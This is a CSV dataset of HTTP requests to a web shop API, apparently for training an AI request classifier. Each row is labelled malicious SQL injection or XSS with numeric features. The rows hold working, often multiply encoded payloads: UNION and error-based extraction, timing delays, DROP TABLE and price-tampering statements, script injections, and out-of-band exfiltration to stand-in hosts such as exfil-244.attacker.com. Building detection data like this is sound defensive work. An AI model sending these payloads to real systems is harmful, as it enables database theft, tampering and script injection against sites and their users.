RequestMethod,RequestURIPath,RequestURIQuery,RequestProtocol,UserAgent,Referer,AcceptEncoding,ContentType,Accept,Cookie,Connection,OtherHeaders,RequestBody,ResponseStatus,AIVerdictLabel,AIVulnerabilityTypeLabel,RequestLength,PathLength,QueryLength,BodyLength,NumParams,LongestParamValueLength,NumSpecialChars,NumEncodedChars,NumDoubleEncodedChars,RatioSpecialCharsToTotalChars,NumKeywords,NumUniqueChars,IsJSONBody,IsXMLBody,IsMultipartForm,HasNumericPathSegment,DepthOfPath,UsesBase64Encoding,UsesHexEncoding,HasMultipleContentLength,InvalidHTTPVersion,NumHTTPHeaders,TimeOfDayHour,TimeOfDayDayOfWeek,Unnamed: 59,Unnamed: 60,Unnamed: 61,Unnamed: 62,Unnamed: 63,Unnamed: 64,Unnamed: 65,Unnamed: 66,Unnamed: 67,Unnamed: 68,Unnamed: 69,Unnamed: 70,Unnamed: 71,Unnamed: 72
PUT,/rest/products/10,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:1243,"{""name"": ""%26%23%78%34%31%3b%26%23%78%37%34%3b%26%23%78%37%34%3b%26%23%78%36%31%3b%26%23%78%36%33%3b%26%23%78%36%62%3b%26%23%78%36%35%3b%26%23%78%36%34%3b%26%23%78%32%30%3b%26%23%78%35%30%3b%26%23%78%37%32%3b%26%23%78%36%66%3b%26%23%78%36%34%3b%26%23%78%37%35%3b%26%23%78%36%33%3b%26%23%78%37%34%3b"", ""description"": ""%26%23x4e%3B%26%23x65%3B%26%23x77%3B%26%23x20%3B%26%23x64%3B%26%23x65%3B%26%23x73%3B%26%23x63%3B%26%23x20%3B%26%23x27%3B%26%23x20%3B%26%23x41%3B%26%23x4e%3B%26%23x44%3B%26%23x20%3B%26%23x55%3B%26%23x54%3B%26%23x4c%3B%26%23x5f%3B%26%23x48%3B%26%23x54%3B%26%23x54%3B%26%23x50%3B%26%23x2e%3B%26%23x52%3B%26%23x45%3B%26%23x51%3B%26%23x55%3B%26%23x45%3B%26%23x53%3B%26%23x54%3B%26%23x28%3B%26%23x27%3B%26%23x68%3B%26%23x74%3B%26%23x74%3B%26%23x70%3B%26%23x3a%3B%26%23x2f%3B%26%23x2f%3B%26%23x65%3B%26%23x78%3B%26%23x66%3B%26%23x69%3B%26%23x6c%3B%26%23x2d%3B%26%23x38%3B%26%23x34%3B%26%23x35%3B%26%23x2e%3B%26%23x61%3B%26%23x74%3B%26%23x74%3B%26%23x61%3B%26%23x63%3B%26%23x6b%3B%26%23x65%3B%26%23x72%3B%26%23x2e%3B%26%23x63%3B%26%23x6f%3B%26%23x6d%3B%26%23x2f%3B%26%23x27%3B%26%23x7c%3B%26%23x7c%3B%26%23x76%3B%26%23x65%3B%26%23x72%3B%26%23x73%3B%26%23x69%3B%26%23x6f%3B%26%23x6e%3B%26%23x28%3B%26%23x29%3B%26%23x29%3B%26%23x20%3B""}",,malicious,sqli,1513,17,0,1243,2,924,343,327,0,0.2722,1,35,TRUE,FALSE,FALSE,TRUE,3,TRUE,TRUE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,path=%2527%2BAND%2B%2528SELECT%2BEXTRACTVALUE%25281%252CCONCAT%25280x7e%252C%2528current_user%2528%2529%2529%252C0x7e%2529%2529%2529%2B,HTTP/1.1,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,339,21,135,0,1,94,22,18,14,0.141,2,38,FALSE,FALSE,FALSE,FALSE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/2,id=%2527%253B%2BDROP%2BTABLE%2Busers%253B%2523,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,238,16,46,0,1,29,10,7,4,0.1613,1,26,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/5,id=%27+AND+%27z%27%3D%27z%27+AND+WAITFOR+DELAY+%270%3A0%3A6%27%23,HTTP/1.1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,287,16,65,0,1,40,20,11,0,0.2469,0,33,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,category=%27%3B+UPDATE+config+SET+price%3D%279724%27+WHERE+id%3D1%3B+,HTTP/1.1,"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,306,21,69,0,1,46,17,7,0,0.1889,0,37,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,search=%27+ANd+%28SeLECt+upDAtExmL%281%2CcOncAt%280X7e%2C%28DatAbAse%28%29%29%2C0x7E%29%29%29+,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,291,21,94,0,1,59,21,14,0,0.1826,2,34,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/9,,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:147,"{""name"": ""Attacked Product"", ""description"": ""New desc ' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.exfil-616.attacker.com\\abc'))) ""}",,malicious,sqli,391,16,0,147,2,97,43,0,0,0.2638,8,49,TRUE,FALSE,FALSE,TRUE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,q=%27%3B+UPDATE+orders+SET+price%3D%276557%27+WHERE+id%3D1%3B+,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,330,21,62,0,1,46,17,7,0,0.2048,0,34,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,category=%2527%2520%2561%256e%2564%2520%2528%2573%2565%254c%2545%2543%2554%2520%2575%2570%2564%2541%2554%2565%2578%256d%256c%2528%2531%252c%2543%256f%254e%2563%2541%2554%2528%2530%2558%2537%2545%252c%2528%2576%2565%2572%2573%2549%256f%254e%2528%2529%2529%252c%2530%2578%2537%2565%2529%2529%2529%252d%252d,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,541,21,304,0,1,177,62,59,59,0.1908,0,27,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/2,id=%27+AND+%28SELECT+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28current_user%28%29%29%2C0x7e%29%29%29%2F%2A,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,318,16,102,0,1,67,23,16,0,0.1949,2,37,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/2,,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:181,"{""name"": ""%41%74%74%41%43%4b%65%44%20%70%52%4f%44%75%63%54"", ""description"": ""nEw+DesC+%27+aNd+UTl_HttP.reQUEst%28%27HTtP%3A%2F%2FexFIl-244.aTTAcKeR.Com%2F%27%7C%7CUSER%28%29%29%23""}",,malicious,sqli,496,16,0,181,2,102,54,30,0,0.2741,1,55,TRUE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/5,,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:70,"{""name"": ""Attacked Product"", ""description"": ""New desc \"" OR 'g'='g'#""}",,malicious,sqli,314,16,0,70,2,22,23,0,0,0.2674,1,33,TRUE,FALSE,FALSE,TRUE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,search=%2527%2520%2561%256e%2564%2520%2574%2552%2555%2545%2520%2541%254e%2564%2520%2573%256c%2545%2565%2550%2528%2534%2529%252f%252a,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,369,21,132,0,1,75,28,25,25,0.183,0,25,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,search=%27+AND+%28SELECT+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28version%28%29%29%2C0x7e%29%29%29%2F%2A,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,338,21,101,0,1,62,22,16,0,0.1803,2,39,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/2,id=%27+UNION+SELECT+NULL%2C+user%28%29%2C+NULL%23,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,242,16,49,0,1,34,14,6,0,0.2154,2,28,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,search=%2527%2520%2541%254e%2544%2520%2528%2553%2545%254c%2545%2543%2554%2520%2555%2550%2544%2541%2554%2545%2558%254d%254c%2528%2531%252c%2543%254f%254e%2543%2541%2554%2528%2530%2578%2537%2565%252c%2528%2564%2561%2574%2561%2562%2561%2573%2565%2528%2529%2529%252c%2530%2578%2537%2565%2529%2529%2529%252d%252d,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,513,21,307,0,1,180,63,60,60,0.1921,0,25,FALSE,FALSE,FALSE,FALSE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/3,id=%27%3B+iNSERT+InTo+CoNFIg+%28PRoduCT_NaMe%29+valueS+%28%27Fuzz_tESt_874%27%29%3B--,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,323,16,85,0,1,64,21,9,0,0.2079,1,39,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/10,id=%2527%2BUNION%2BSELECT%2BNULL%252C%2BNULL%252C%2BNULL%252C%2BNULL%252C%2BNULL%252C%2Bdatabase%2528%2529%252C%2BNULL%2523,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,325,17,123,0,1,82,22,19,10,0.1571,2,33,FALSE,FALSE,FALSE,TRUE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,q=%3Cinput+type%3Dtext+onmouseover%3Dconsole.log%28%27XSS%27%29+autofocus%3E,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,273,21,76,0,1,58,15,8,0,0.1546,2,36,False,False,False,False,3,False,True,False,False,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,query=%3Cbody+onkeydown%3Dalert%281%29%3E,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,278,21,41,0,1,25,9,5,0,0.1452,1,30,False,False,False,False,3,False,True,False,False,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,query=%3Cinput+type%3Dsearch+onkeyup%3Dalert%281%29+autofocus%3E,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,285,21,64,0,1,46,12,6,0,0.1412,2,30,False,False,False,False,3,False,True,False,False,4,3,Tuesday,,,,,,,,,,,,,,
POST,/api/Users/,,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:145,"{""email"": ""<script>alert(1)</script>@example.com"", ""password"": ""password123"", ""passwordRepeat"": ""password123"", ""securityAnswer"": ""My pet's name""}",,malicious,xss,386,11,0,145,4,37,38,0,0,0.2436,6,38,True,False,False,False,2,True,False,False,False,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,search=%26%23x64%3B%26%23x61%3B%26%23x54%3B%26%23x41%3B%26%23x3a%3B%26%23x54%3B%26%23x45%3B%26%23x78%3B%26%23x54%3B%26%23x2f%3B%26%23x68%3B%26%23x54%3B%26%23x6d%3B%26%23x4c%3B%26%23x2c%3B%26%23x25%3B%26%23x33%3B%26%23x63%3B%26%23x53%3B%26%23x43%3B%26%23x52%3B%26%23x49%3B%26%23x70%3B%26%23x54%3B%26%23x25%3B%26%23x33%3B%26%23x65%3B%26%23x63%3B%26%23x4f%3B%26%23x6e%3B%26%23x73%3B%26%23x6f%3B%26%23x6c%3B%26%23x45%3B%26%23x2e%3B%26%23x4c%3B%26%23x4f%3B%26%23x47%3B%26%23x25%3B%26%23x32%3B%26%23x38%3B%26%23x25%3B%26%23x32%3B%26%23x37%3B%26%23x58%3B%26%23x53%3B%26%23x73%3B%26%23x25%3B%26%23x32%3B%26%23x37%3B%26%23x25%3B%26%23x32%3B%26%23x39%3B%26%23x25%3B%26%23x33%3B%26%23x63%3B%26%23x25%3B%26%23x32%3B%26%23x66%3B%26%23x73%3B%26%23x43%3B%26%23x52%3B%26%23x69%3B%26%23x70%3B%26%23x54%3B%26%23x25%3B%26%23x33%3B%26%23x45%3B,HTTP/1.1,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,1027,21,823,0,1,408,207,204,0,0.2453,0,27,False,False,False,False,3,True,True,False,False,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,category=%2526%2523%2578%2533%2563%253b%2526%2523%2578%2537%2533%253b%2526%2523%2578%2537%2536%253b%2526%2523%2578%2536%2537%253b%2526%2523%2578%2532%2566%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2536%2533%253b%2526%2523%2578%2536%2538%253b%2526%2523%2578%2536%2531%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2536%2537%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2533%2564%253b%2526%2523%2578%2536%2533%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2537%2533%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2563%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2532%2565%253b%2526%2523%2578%2536%2563%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2537%253b%2526%2523%2578%2532%2538%253b%2526%2523%2578%2532%2537%253b%2526%2523%2578%2535%2538%253b%2526%2523%2578%2535%2533%253b%2526%2523%2578%2535%2533%253b%2526%2523%2578%2532%2537%253b%2526%2523%2578%2532%2539%253b%2526%2523%2578%2533%2565%253b,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,1267,21,999,0,1,594,201,198,198,0.1971,0,26,False,False,False,False,3,True,True,False,False,4,3,Tuesday,,,,,,,,,,,,,,
POST,/api/Users/,,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:140,"{""email"": ""user2874@example.com"", ""password"": ""password123"", ""passwordRepeat"": ""password123"", ""securityAnswer"": ""<script>alert(1)</script>""}",,malicious,xss,381,11,0,140,4,25,37,0,0,0.245,6,39,True,False,False,False,2,False,False,False,False,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,q=%3CiMG+srC%3Dx+OneRroR%3DaLerT%26%2340%3B1%26%2341%3B%3E,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,326,21,58,0,1,36,15,10,0,0.1899,1,35,False,False,False,False,3,False,True,False,False,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,query=data%253Atext%252Fhtml%252C%25253Cscript%25253Ealert%252528document.domain%252529%25253C%25252Fscript%25253E,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,392,21,188,0,1,111,40,37,37,0.1914,0,26,False,False,False,False,3,False,True,False,False,4,3,Tuesday,,,,,,,,,,,,,,
